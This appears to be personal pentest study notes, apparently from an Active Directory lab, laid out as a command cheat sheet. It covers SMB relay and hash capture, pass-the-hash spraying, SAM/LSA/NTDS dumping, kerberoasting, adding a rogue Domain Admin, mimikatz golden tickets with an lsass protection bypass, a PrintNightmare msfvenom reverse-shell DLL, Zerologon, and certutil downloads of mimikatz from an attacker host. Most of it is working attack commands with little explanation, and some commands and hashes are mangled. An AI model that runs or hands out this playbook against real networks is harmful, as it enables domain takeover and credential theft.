### Nmap

for smb relay attacks => To find host without smb signing
nmap --script=smb2-security-mode.nse -p445 {targetip}

then starting responder to intercept request to our IP

responder -I eth0 -dvw

now using ntlmrelay to relay to target machine
impacket-ntlmrelayx -tf targets.txt -smb2support -c "whoami"

output:

```
admin hash=> Administrator:500:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::

Administrator:500:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::

Administrator:500:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
```

### Gaining shell

using metasploit is also possible but defense picks it up,

so we can use psexec.py

Passthehash
we can use captured hash to authenticate to ldap login
using psexec

```
impacket-psexec marvel/fcastle@192.168.46.69 -hashes sdfasfsfsdfsdf
```

### IPv6 Attack

spoffing as DNS server for IPv6 using mitm6 and ntlmrelay to relay to ldap like this

```
impacket-ntlmrelayx -6 -t ldaps://192.168.36.69 -wh faewpad.marvel.local -l lootme
mitm6 -d marvel.local

```

# Post Compromise Enumeration

### Using ldapdomaindump

```
ldapdomaindump 192.168.36.69 -u 'domain/user' -p password
```

### Using Bloodhound

```
sudo neo4j console
sudo bloodhound
sudo bloodhound-python -d Marvel.local -u fcastle -p Password1 -ns 192.168.34.56 -c all
```

# Attacking Active Directory: Post-Compromise Attacks:

### Pass Attacks

Spraying captured pass and gathering local hash to everywhere over the network using:

```
crackmapexec smb targetiprange/24 -u fcastle -d MARVEL.local -p Password1
```

using hash

```
cracrackmapexec smb 192.168.36.0/24 -u administrator -H aad3b435b51404eeaad3b435b51404ee:7facdc498ed1680c4fd1448319a8c04f --local-auth
```

authentication via hash and gathering local SAM hashes:

```
crackmapexec smb 192.168.36.0/24 -u administrator -H aad3b435b51404eeaad3b435b51404ee:7facdc498ed1680c4fd1448319a8c04f --local-auth --sam
```

To see Shares shared with user:

```
crackmapexec smb 192.168.36.0/24 -u administrator -H aad3b435b51404eeaad3b435b51404ee:7facdc498ed1680c4fd1448319a8c04f --local-auth --shares
```

Dumping lsa:

```
crackmapexec smb 192.168.36.0/24 -u administrator -H aad3b435b51404eeaad3b435b51404ee:7facdc498ed1680c4fd1448319a8c04f --local-auth --lsa
```

see module for eg of smb:

```
crackmapexec smb -L
```

use that module again like this using "-M" and module name:

```
crackmapexec smb 192.168.36.0/24 -u administrator -H aad3b435b51404eeaad3b435b51404ee:7facdc498ed1680c4fd1448319a8c04f --local-auth -M lsassy
```

Using crackmapexec database cmedb using cmedb in terminal

### Dumping and Cracking Hashes

using secretdump:

```
impacket-secretsdump marvel/fcastle:'Password1'@192.158.242.32
```

going through every machine to capture dumps like .33 now afrer .32

using hash to do same thing we can use:

```
impacket-secretsdump marvel/fcastle:@192.158.242.32 -hashes asdlaskdlasldlasd
```

using hashcat to crack the hashes
hashcat -m 1000 has.txt /wordlist

### Kerberoasting

Using

```
impacket-GetUserSPNs MARVEL.local/fcastle:Password1 -dc-ip 192.168.36.69 -request
```

we can capture TGS token and crack it by using user credentials
and then cracking hash

### Token Impersonation

go to msfconsole

````
search psexec
load incognito
list_tokens -u
impersonate_token username
``
like this we can impersonate token to aim for admin account and can create same type of account with admin privilege
but first we need to have shell so we should spawn shell in meterpreter first before entering below commands
using:

```net user /add hacker Password! /domain

net group "Domain Admins" hacker /ADD /Domain
````

now the user "hawkeye" is added with admim privilege

### Attacking GPP/Cpassword

older windows AD version used to encrypt and store password in file names cpassword we can crack this
from metasploit using module smb_enum_gpp

### NTDS.dit Dumping with mimikatz

download mimikatz from github and run mimikatz.exe in victim PC

### Golden Ticket Attack

Golden Ticket means we are able to access all machines in a domain controller by using TGT token

```
mimikatz.exe
privilege::debug
lsadump::lsa /inject /name:krbtgt
sometimes when using this an error occurs: mimikatz # lsadump::lsa /inject /name:krbtgt
ERROR kuhl_m_lsadump_lsa_getHandle ; OpenProcess (0x00000005)
Domain : CHADDUFFEY / S-1-5-21-465565427-3215364919-2731916836
RID : 000001f6 (502)
User : krbtgt
ERROR kuhl_m_lsadump_lsa_user ; SamQueryInformationUser c0000003
```

We can get over this using:

```
mimikatz # !+
mimikatz # !processprotect /process:lsass.exe /remove
Process : lsass.exe
PID 644
```

and reenter command again

then we will generate golden ticket using this command and pass it using /ptt:

kerberos::golden /User:Administrator /domain:marvel.local /sid:S-1-5-21-1558675338-2421338585-1465622942 /krbtgt:8964443726f4ea4d0237b2d635dfdf77 /id:500 /ptt

# Using Known Exploits

### CVE-2021-1675 (Print Nightmare)

Making shell.dll using msfvenom to deliver to target:
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.36.21 LPORT=5555 -f dll > /opt/shell.dll

Starting msfconsole and using /exploit/multi/handler and run

```
sharing shell.dll using:
impacket-smbserver share `pwd`
```

Now, finally copying CVW.py from github and running it
python CVE.py param param to attack it

### CVE-2020-1472 (ZERO-LOgon)

Running this attack in real world pentest could bring down Domain controller so we should get permission before and be more cautious
but should scan dc first if it is vulnerable or not.

lets run zerologon-tester.py
if it is vulnerable then

python CVE-2020-1472-explot.py HYDRA-DC ip

# Post Exploitation

### File Transfer

Using Certutil: certutil.exe -urlcache -f http://12.121.123.13/a.txt file.txt

hosting with python: python -m http.server 80

Navigating through Browser

    FTP: python -m pyftpdlib 21 <= Attacker Machine
    ftp ip

### Pivoting

using Proxychains
using sshuttle
using chisel

certutil.exe -urlcache -f http://192.168.36.21/mimikatz.exe mimikatz.exe

certutil.exe -urlcache -f http://192.168.36.21/mimilib.dll mimilib.dll

certutil.exe -urlcache -f http://192.168.36.21/mimispool.dll mimispool.dll
